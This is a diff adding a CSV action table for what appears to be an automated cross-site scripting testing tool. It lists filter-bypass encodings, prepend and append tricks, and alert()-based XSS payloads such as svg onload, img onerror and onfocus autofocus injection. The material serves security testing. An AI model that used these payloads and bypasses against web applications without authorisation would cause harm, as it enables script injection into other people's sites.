@@ -1,0 +1,57 @@
+Action,Description,Category
+SendHTTPRequest,Send the HTTP request with a generic input string (i.e. testNTTData),BaseAction
+SetCharsetUTF7,Send in input charset utf7,SetCharset
+MixUppercase,Mix lower and upper case character for the tag in order to bypass filter,TagAction
+SemicolonUrlEncoding,The ; is encoded as %3B,SemcolonEncoding
+SemicolonClean,The ; is not encoded,SemcolonEncoding
+DoubleQuoteClean,The double quote is not encoded,DoubleQuoteEncoding
+DoubleQuoteRemove,Remove double quote,DoubleQuoteEncoding
+EncodeQuoteBacktick,Encode double quote with backtick,DoubleQuoteEncoding
+EscapeDoubleQuote,"The double quote is escaped \""",DoubleQuoteEncoding
+EncodeDoubleQuoteLineFeed,"Encode "" with %0A",DoubleQuoteEncoding
+UTF7Encoding,Encode double quote with utf7 encoding,DoubleQuoteEncoding
+N/A,Not relevant in this status,Generic
+SvgBasePayload,<svg onload=alert()>,PAYLOAD
+ScriptBasePayload,<script>alert(1);</script>,PAYLOAD
+AlertPayload,alert(1); as payload,PAYLOAD
+GenericStringPayload,testString as payload,PAYLOAD
+OnMouseOverPayload,onmouseover=alert(1),PAYLOAD
+QuotePayload,single quote (') as payload,PAYLOAD
+OnErrorPayload,onerror=alert(1),PAYLOAD
+OnFocusPayload,"onfocus=""alert(1)"" autofocus=""""",PAYLOAD
+ImgStringPayload,<img src=xss onerror=alert(1)>,PAYLOAD
+AllValuesPayload," ""<>sss as payload",PAYLOAD
+JavascriptBasePayload,"javascript://""+alert(1)  as payload",PAYLOAD
+BaseHTTPGoogleRequest,https://google.com,PAYLOAD
+QuoteClean,The single quote is not encoded,SingleQuoteEncoding
+EncodeQuoteBacktick,The single quote is converted to backtick,SingleQuoteEncoding
+EncodeQuoteLineFeed,Encode ' with %0A,SingleQuoteEncoding
+EncodeSpaceSlash,Encode space with slash,SpaceEncoding
+SpaceClean,Spaces not encoded,SpaceEncoding
+EncodingTagBracketTest,"Send all encodings of <testNTT string:
+<testString
+%3CtestString
+&lttestString
+....
+&#X0003C;testString
+&#X00003C;testString
+&#X000003C;testString
+\u003ctestString
+\u003CtestString",TagBracketEncoding
+AppendJSFix,Append a string that fixes the JS code,AppenToPayload
+AppendParenthesisAndSemicolon,Append ;),AppendToPayload
+AppendParenthesisAndSemicolonAndUrlSemicolon,Append ;)%3B,AppendToPayload
+AppendLineFeed,A %0A is appended,AppendToPayload
+AppendNothing,Nothing is appended,AppendToPayload
+PrependSingleQuoteParenthesisAndSemicolonAndUrlSemicolon,Prepend ';)%3B,PrependToPayload
+PrependJSFix,Prepend a string that fixes the JS code,PrependToPayload
+PrependDoubleQuote,"Prepend xss""",PrependToPayload
+PrependHtmlCloseAttributeInTag,"Close an attribute in order to create an atack as the following:
+"" onfocus=""alert(1)"" autofocus=""",PrependToPayload
+PrependSpace,Prepend xss+space,PrependToPayload
+PrependSingleQuote,Prepend xss',PrependToPayload
+PrependParenthesisAndSemicolon,Prepend ;),PrependToPayload
+PrependLineFeed,A %0A is prepended,PrependToPayload
+PrependHtmlClosureTag,Close Html tag in order to include attack ,PrependToPayload
+PrependNothing,Nothing is prepended,PrependToPayload
+EncodingParenthesisBacktick,The parenthesis is converted to backtick,ParenthesisEncoding
